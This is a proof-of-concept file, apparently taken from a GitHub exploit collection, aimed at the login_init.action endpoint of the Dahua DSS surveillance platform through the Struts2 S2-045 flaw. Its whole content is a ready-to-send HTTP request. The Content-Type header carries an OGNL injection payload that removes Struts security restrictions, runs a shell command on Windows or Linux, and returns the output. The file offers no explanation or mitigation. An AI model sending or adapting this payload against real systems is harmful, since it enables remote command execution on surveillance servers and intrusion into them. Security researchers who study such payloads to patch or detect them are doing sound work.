# dahuadss_login_init.action_struts2

from: https://github.com/wy876/POC/blob/main/%E5%A4%A7%E5%8D%8EDSS%E5%9F%8E%E5%B8%82%E5%AE%89%E9%98%B2%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0login_init.action%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8Struct2-045%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md

```
POST /portal/login_init.action HTTP/1.1
Host: 
Connection: close
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
Cache-Control: no-cache
Pragma: no-cache
User-Agent: Java/1.8.0_333
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 0

```
